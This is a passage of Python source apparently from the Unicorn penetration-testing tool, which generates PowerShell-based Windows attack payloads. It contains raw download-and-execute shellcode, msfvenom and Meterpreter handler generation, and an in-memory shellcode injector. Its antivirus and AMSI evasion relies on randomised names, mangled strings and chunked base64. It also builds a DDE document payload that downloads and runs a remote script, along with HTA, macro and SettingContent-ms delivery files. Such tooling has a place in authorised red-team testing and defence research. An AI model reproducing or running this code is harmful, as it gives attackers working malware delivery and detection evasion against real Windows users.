                     "\\x70\\x14\\xAD\\x96\\xAD\\x8B\\x58\\x10\\x8B\\x53"
                     "\\x3C\\x03\\xD3\\x8B\\x52\\x78\\x03\\xD3\\x8B\\x72"
                     "\\x20\\x03\\xF3\\x33\\xC9\\x41\\xAD\\x03\\xC3\\x81"
                     "\\x38\\x47\\x65\\x74\\x50\\x75\\xF4\\x81\\x78\\x04"
                     "\\x72\\x6F\\x63\\x41\\x75\\xEB\\x81\\x78\\x08\\x64"
                     "\\x64\\x72\\x65\\x75\\xE2\\x8B\\x72\\x24\\x03\\xF3"
                     "\\x66\\x8B\\x0C\\x4E\\x49\\x8B\\x72\\x1C\\x03\\xF3"
                     "\\x8B\\x14\\x8E\\x03\\xD3\\x33\\xC9\\x51\\x68\\x2E"
                     "\\x65\\x78\\x65\\x68\\x64\\x65\\x61\\x64\\x53\\x52"
                     "\\x51\\x68\\x61\\x72\\x79\\x41\\x68\\x4C\\x69\\x62"
                     "\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x53\\xFF\\xD2"
                     "\\x83\\xC4\\x0C\\x59\\x50\\x51\\x66\\xB9\\x6C\\x6C"
                     "\\x51\\x68\\x6F\\x6E\\x2E\\x64\\x68\\x75\\x72\\x6C"
                     "\\x6D\\x54\\xFF\\xD0\\x83\\xC4\\x10\\x8B\\x54\\x24"
                     "\\x04\\x33\\xC9\\x51\\x66\\xB9\\x65\\x41\\x51\\x33"
                     "\\xC9\\x68\\x6F\\x46\\x69\\x6C\\x68\\x6F\\x61\\x64"
                     "\\x54\\x68\\x6F\\x77\\x6E\\x6C\\x68\\x55\\x52\\x4C"
                     "\\x44\\x54\\x50\\xFF\\xD2\\x33\\xC9\\x8D\\x54\\x24"
                     "\\x24\\x51\\x51\\x52\\xEB\\x47\\x51\\xFF\\xD0\\x83"
                     "\\xC4\\x1C\\x33\\xC9\\x5A\\x5B\\x53\\x52\\x51\\x68"
                     "\\x78\\x65\\x63\\x61\\x88\\x4C\\x24\\x03\\x68\\x57"
                     "\\x69\\x6E\\x45\\x54\\x53\\xFF\\xD2\\x6A\\x05\\x8D"
                     "\\x4C\\x24\\x18\\x51\\xFF\\xD0\\x83\\xC4\\x0C\\x5A"
                     "\\x5B\\x68\\x65\\x73\\x73\\x61\\x83\\x6C\\x24\\x03"
                     "\\x61\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69"
                     "\\x74\\x54\\x53\\xFF\\xD2\\xFF\\xD0\\xE8\\xB4\\xFF"
                     "\\xFF\\xFF\\xURLHERE\\x00")

        url = ipaddr.replace("LHOST=", "").replace("url=", "")
        url_patched = url_hexified(url)
        data = shellcode.replace("\\xURLHERE", url_patched)

    else:

        # gen random number for length
        uri_length=generate_random_number(3,6)

        proc = subprocess.Popen("msfvenom -p {0} {1} {2} --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        data = proc.communicate()[0]
        # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
        #data = data.decode("ascii").replace('"\\xfc', '"', 1)

    return format_metasploit(data)

# generate shellcode attack and replace hex
def gen_shellcode_attack(payload, ipaddr, port):
    # regular payload generation stuff
    # generate our shellcode first
    if ipaddr != ("cobaltstrike"):
        shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
        # sub in \x for 0x
        shellcode = re.sub("\\\\x", "0x", shellcode)
        # base counter
        counter = 0
        # count every four characters then trigger floater and write out data
        floater = ""
        # ultimate string
        newdata = ""
        for line in shellcode:
            floater += line
            counter += 1
            if counter == 4:
                newdata = newdata + floater + ","
                floater = ""
                counter = 0

        # here's our shellcode prepped and ready to go
        shellcode = newdata[:-1]

        # if we aren't using download/exec
        if not "url=" in ipaddr:
            # write out rc file
            write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))

    # switch variable to be shellcode for formatting
    if ipaddr == "cobaltstrike": shellcode = payload

    # added random vars before and after to change strings
    # this is a hack job but it works in checking to see if there are any variable name conflicts. While random, can happen when using only 2 randomized characters for char lenght. 
    while True:
        varcheck = ("")
        reroll = False
        var1 = "$" + generate_random_string(2, 2) # $1
        varcheck = var1
        var2 = "$" + generate_random_string(2, 2) # $c
        if var2.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var2
        var3 = "$" + generate_random_string(2, 2) # $2 - powershell
        if var3.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var3
        var4 = "$" + generate_random_string(2, 2) # $3
        if var4.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var4
        var5 = "$" + generate_random_string(2, 2) # $x
        if var5.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var5
        var6 = "$" + generate_random_string(2, 2) # $t
        if var6.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var6
        var7 = "$" + generate_random_string(2, 2) # $h
        if var7.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var7
        var8 = "$" + generate_random_string(2, 2) # $z
        if var8.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var8
        var9 = "$" + generate_random_string(2, 2) # $g
        if var9.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var9
        var10 = "$" + generate_random_string(2, 2) # $i
        if var10.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var10
        var11 = "$" + generate_random_string(2, 2) # $w
        if var11.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var11
        var12 = (str(generate_random_number(1001,1010)))
        if var12.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var12
        var13 = "$" + generate_random_string(2, 2) # $4 - Windows
        if var13.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var13
        var14 = generate_random_string(3, 3) # $allocreplace
        if var14.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var14
        tempvar_withoutdollar = generate_random_string(3, 3) # $tempvar
        var15 = "$" + tempvar_withoutdollar
        if var15.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var15

        var16 = generate_random_string(3,3) # $createthread
        if var16.lower() in varcheck.lower():
            reroll = True
        varcheck = varcheck + var16

        if reroll == True: print("[*] Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names.")
        if reroll == False: break

    # generate random service name from win32 - defender was looking from name win32 + 0x00 length inside of byte array
    randomize_service_name = generate_random_string(2,2)

    # randomize kernel32.dll for fun
    random_length = generate_random_number(1,12)

    # randomize kernel32.dll and msvcrt.dll
    kernel = mangle_word("kernel32.dll")
    msv = mangle_word("msvcrt.dll")
    virtual_alloc = mangle_word("calloc")
    create_thread = mangle_word("CreateThread")

    # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily
    random_symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
    mangle_shellcode = (random.choice(random_symbols))

    #mangle_shellcode = generate_random_string(1, 1).upper()
    shellcode = shellcode.replace("0x", mangle_shellcode)

    # one line shellcode injection with native x86 shellcode
    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr $allocreplace(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr $createthreadreplace(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$tttt=$tttt.replace("$createthreadreplace", "%s");$tttt=$tttt.replace("$allocreplace", "%s");$wwww=Add-Type -member $tttt -Name "%s" -namespace Win32Functions -pass;$zzzz="%s";[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","0x").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$wwww::CreateThread(0,0x00,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex " $2222 -e $hhhh -noe"''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,create_thread,virtual_alloc,randomize_service_name,shellcode)).replace("SHELLCODE_STUB", mangle_shellcode)

    # if we want to use AMSI bypassing, currently snagged by defender based on signature updates - easy to get around if you mangle
    if AMSI_BYPASS.lower() == "on": powershell_code = bypass_amsi() + ";" + powershell_code

    # run it through a lame var replace
    powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
        "$2222", var3).replace("$3333", var4).replace("$xxxx", var5).replace("$tttt", var6).replace(
        "$hhhh", var7).replace("$zzzz", var8).replace("$gggg", var9).replace("$iiii", var10).replace(
        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13).replace("$allocreplace", var14).replace("$tempvar", var15).replace("$createthreadreplace", var16)

    # if we have PRINT_DECODED="ON" this will spit out the raw powershell code for you
    if PRINT_DECODED.lower() == "on":
        print(powershell_code)
        print("\n[*] Note that PRINT_DECODED inside unicorn.py was specified and printing the raw output for the PowerShell code. Turn this off to get the full unicorn code.")
        sys.exit()

    return powershell_code

def gen_ps1_attack(ps1path):
    if os.path.isfile(ps1path):
        with open(ps1path, 'r') as scriptfile:
            data = scriptfile.read()
            return data
    else:
        print("[!] {0} does not exist. Please check your path".format(ps1path))
        sys.exit(1)


def format_payload(powershell_code, attack_type, attack_modifier, option):
    gen_unicorn()
    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
    print("Twitter: @TrustedSec, @HackingDave")
    print("\nHappy Magic Unicorns.")

    ran1 = generate_random_string(2, 3)
    ran2 = generate_random_string(2, 3)
    ran3 = generate_random_string(2, 3)
    ran4 = generate_random_string(2, 3)

    # format payload is for adding chunking to evade detection
    avblah = base64.b64encode(powershell_code.encode('utf_16_le')) # kinder gentler dave variable name now
    # here we mangle our encodedcommand by splitting it up in random chunks
    avsux = randomint = random.randint(4000,5000)
    avnotftw = [avblah[i: i + avsux] for i in range(0, len(avblah), avsux)]
    haha_av = ""
    counter = 0
    for non_signature in avnotftw:
        non_signature = (non_signature.rstrip())
        if counter > 0: haha_av = haha_av + ("+")
        if counter > 0: haha_av = haha_av + ("'") 
        surprise_surprise = non_signature.decode("ascii") + ("'")
        haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy
        haha_av = haha_av.replace("==", "'+'==")
        counter = 1

    full_attack = '''powershell /w 1 /C "s''v {0} -;s''v {1} e''c;s''v {2} ((g''v {3}).value.toString()+(g''v {4}).value.toString());powershell (g''v {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
    # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak

    # for cobalt strike
    if attack_type == "cs":

        # generate the hta attack vector with cobalt strike
        if attack_modifier == "hta":
            gen_hta_attack(full_attack)
            cobalt_strike()
            hta_help()
            print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")

        elif attack_modifier == "ms":
            ms_voodoo_stuff()
            gen_hta_attack(full_attack)
            cobalt_strike()
            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
            settings_ms()
            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")

        elif attack_modifier == "macro":
            macro_attack = generate_macro(full_attack)
            write_file("powershell_attack.txt", macro_attack)
            cobalt_strike()
            macro_help()
            print("[*] Exported the Cobalt Strike Unicorn Attack for Macros out to powershell_attack.txt. Enjoy!\n")

        else:
            write_file("powershell_attack.txt", full_attack)
            cobalt_strike()
            print("[*] Exported the Cobalt Strike Unicorn Attack codebase out to powershell_attack.txt. Enjoy!\n")

    # for custom shellcode
    if attack_type == "shellcode":
        if attack_modifier == "hta":
            gen_hta_attack(full_attack)
            custom_shellcode()
            hta_help()
            print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")

        elif attack_modifier == "ms":
            ms_voodoo_stuff()
            gen_hta_attack(full_attack)
            custom_shellcode()
            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
            settings_ms()
            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")

        elif attack_modifier == "macro":
            macro_attack = generate_macro(full_attack)
            write_file("powershell_attack.txt", macro_attack)
            custom_shellcode()
            macro_help()

        else:
            # add HTA option for shellcode
            if "hta" in sys.argv:
                gen_hta_attack(full_attack)
                print("[*] Exported the custom shellcode to the hta generation under the hta_attacks folder. Enjoy!|n")
            if "macro" in sys.argv:
                macro_gen = generate_macro(full_attack)
                write_file("powershell_attack.txt", macro_gen)
                print("[*] Exported the custom shellcode to the macro generation and exported to powershell_attack.txt. Enjoy!\n")
            else:
                write_file("powershell_attack.txt", full_attack)
                custom_shellcode()
                print("[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\n")

    if attack_type == "msf" or attack_type == "download/exec":
        if attack_modifier == "macro":
            macro_attack = generate_macro(full_attack)
            write_file("powershell_attack.txt", macro_attack)
            macro_help()

        elif attack_modifier == "hta":
            gen_hta_attack(full_attack)
            # move unicorn to hta attack if hta specified
            shutil.move("unicorn.rc", "hta_attack/")
            hta_help()

        elif attack_modifier == "ms":
            ms_voodoo_stuff()
            gen_hta_attack(full_attack)
            custom_shellcode()
            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
            shutil.move("unicorn.rc", "hta_attack/")
            settings_ms()
            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")

        else:  # write out powershell attacks

            if len(full_attack) > 8191:
                if AMSI_BYPASS.lower() == "on":
                    print("[*] Note that AMSI_BYPASS is currently set to 'ON' which incorporates an AMSI Bypass technique that is large in nature.")
                    print("[*] Windows command prompt has a character restriction of 8191 which if you are using cmd.exe as a payload delivery option, this will not work.")
                    print("[*] Turn off AMSI_BYPASS=ON in the unicorn.py file located at the very top to turn this feature off which is ON by default.")
                    print("[*] If you are calling PowerShell directly, this isn't a concern.")
                print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
                print("[!] Total Payload Length Size: " + str(len(full_attack)))
                raw_input("Press {return} to continue.")
                #sys.exit()

            # format for dde specific payload
            if attack_modifier == "dde":
                full_attack_download = full_attack[11:] # remove powershell + 1 space
                # incorporated technique here -> http://staaldraad.github.io/2017/10/23/msword-field-codes/
                full_attack = ('''DDE "C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://%s/download.ps1'); # " "Microsoft Document Security Add-On"''' % (ipaddr)) # quote = WindowsPowerShell, powershell.exe, and iex
                with open ("download.ps1", "w") as fh: fh.write(full_attack_download)

            write_file("powershell_attack.txt", full_attack)
            if attack_modifier != "dde":
                if AMSI_BYPASS.lower() == "on": amsi_help() # print the AMSI bypass language
                ps_help() # present normal powershell attack instructions

            # if we are using dde attack, present that method
            if attack_modifier == "dde":
                dde_help()

    elif attack_type == "custom_ps1":
        if attack_modifier == "macro":
            macro_attack = generate_macro(full_attack, option)
            write_file("powershell_attack.txt", macro_attack)
        else:
            write_file("powershell_attack.txt", full_attack)

        custom_ps1_help()

    else:
        if attack_type != "cs":
            if attack_type != "shellcode":
                if attack_modifier != "hta":
                    if attack_modifier != "macro":
                       write_file("powershell_attack.txt", full_attack)
                       ps_help()

    # Print completion messages
    if attack_type == "msf" and attack_modifier == "hta":
        print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
        print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
        print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
        print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")

    elif attack_type == "msf" or attack_type =="download/exec":
        print("[*] Exported powershell output code to powershell_attack.txt.")
        if attack_type != "download/exec":
            print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.")

        if attack_type == "download/exec":
            print("[*] This attack does not rely on Metasploit, its custom shellcode. Whatever you execute, if its a payload that is a reverse connection, make sure you have a listener setup.")

        if attack_modifier == "dde":
            print("[*] Exported download.ps1 which is what you use for code execution. (READ INSTRUCTIONS)")
        print("\n")

    elif attack_type == "custom_ps1":
        print("[*] Exported powershell output code to powershell_attack.txt")


# This is the SettingContent-ms filetype based on research here: https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
def ms_voodoo_stuff():
    # read file content in
    ms_input = open("templates/Standalone_NoASR.SettingContent-ms", "r").read()
    # write the content out
    write_file("Standalone_NoASR.SettingContent-ms", ms_input)
    settings_ms()

# pull the variables needed for usage
try:
    attack_type = ""
    attack_modifier = ""
    payload = ""
    ps1path = ""

    if len(sys.argv) > 1:
        if sys.argv[1] == "--help":
            ps_help()
            macro_help()
            hta_help()
            cert_help()
            custom_ps1_help()
            dde_help()
            cobalt_strike()
            gen_usage()
            sys.exit()

        # settings option for SettingContent-ms filetype attack vector
        if sys.argv[1] == "ms":
            attack_type = ("ms")

        else:
            if len(sys.argv) > 2 and sys.argv[2] == "crt":
                attack_type = "crt"
                payload = sys.argv[1]
            elif re.search('\.ps1$', sys.argv[1]) is not None:
                attack_type = "custom_ps1"
                ps1path = sys.argv[1]

            elif sys.argv[1] =="windows/download_exec":
                attack_type = "download/exec"
                port = "none"
                if "macro" in sys.argv: attack_modifier = "macro"

            elif sys.argv[2] == "cs":
                attack_type = "cs"

                # using hta attack within custom shellcode or cobalt strike
                if "hta" in sys.argv: 
                    attack_modifier = "hta"

                if "ms" in sys.argv:
                    attack_modifier = "ms"

                # using macro attack within custom shellcode or co balt strike
                if "macro" in sys.argv:
                    attack_modifier = "macro"

            elif sys.argv[2] == "shellcode":
                attack_type = "shellcode"

            else:
                attack_type = "msf"
                payload = sys.argv[1]

    # if we are using macros
    if len(sys.argv) == 5:
        if attack_type == "msf":  # msf macro attack
            ipaddr = sys.argv[2]
            port = sys.argv[3]
            attack_modifier = sys.argv[4]
            ps = gen_shellcode_attack(payload, ipaddr, port)

        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit(1)

        format_payload(ps, attack_type, attack_modifier, None)

    # this is our cobalt strike and custom shellcode menu
    elif attack_type == "cs" or attack_type == "shellcode": 
        if not os.path.isfile(sys.argv[1]): 
            print("[!] File not found. Check the path and try again.")
            sys.exit()
        payload = open(sys.argv[1], "r").read()

        if not "," in payload:

            # attempt to see if its metasploit
            payload = format_metasploit(payload)

        if attack_type == "cs":
            #if not "char buf[] =" in payload:
            if not "byte[] buf = new byte" in payload:
                if not " byte buf[]" in payload:
                    print("[!] Cobalt Strike file either not formatted properly or not the C#/CS format.")
                    sys.exit()

            payload = payload.split("{")[1].replace(" };", "").replace(" ", "") # stripping out so we have 0x00 format

        ipaddr = "cobaltstrike"
        port = "cobaltstrike"
        ps = gen_shellcode_attack(payload, ipaddr, port)
        if attack_modifier != "hta":
            if attack_modifier != "macro":
                if attack_modifier != "ms":
                    attack_modifier = ("cs")

        format_payload(ps, attack_type, attack_modifier, None)

    # default unicorn & custom ps1 macro attacks
    elif len(sys.argv) == 4 or attack_type == "download/exec":
        if attack_type == "custom_ps1":  # custom ps1 macro attack
            attack_modifier = sys.argv[2]
            option = sys.argv[3]
            ps = gen_ps1_attack(ps1path)
        elif attack_type == "msf" or attack_type == "download/exec":
            payload = sys.argv[1]
            if attack_type != "download/exec":
                port = sys.argv[3]
            ipaddr = sys.argv[2]
            if attack_modifier != "macro":
                attack_modifier = ""
            option = None
            ps = gen_shellcode_attack(payload, ipaddr, port)

        # It should not be possible to get here, but just in case it does for some reason in the future, it will
        # prevent usage of 'ps' and 'option', causing the app to crash
        else:
            print("[!] Something went way wrong while generating payload.")
            sys.exit()

        format_payload(ps, attack_type, attack_modifier, option)

    elif len(sys.argv) == 3:
        # Matthews base64 cert attack or cs
        if attack_type == "crt":
            cert_help()
            # generate the attack vector
            gen_cert_attack(payload)
        elif attack_type == "custom_ps1":
            attack_modifier = sys.argv[2]
            ps = gen_ps1_attack(ps1path)
            format_payload(ps, attack_type, attack_modifier, None)

        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit()

    elif len(sys.argv) == 2:
        if attack_type == "custom_ps1":
            ps = gen_ps1_attack(ps1path)
            format_payload(ps, attack_type, None, None)

        # here we start the magic voodoo stuff for SettingContent-ms
        elif attack_type == "ms":
            ms_voodoo_stuff()

        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit()

    # if we did supply parameters
    elif len(sys.argv) < 2:
        gen_unicorn()
        gen_usage()

except KeyboardInterrupt:
    print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
    sys.exit()

except Exception as e:
    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
    else: print("[!] Something went wrong, printing the error: " + str(e))
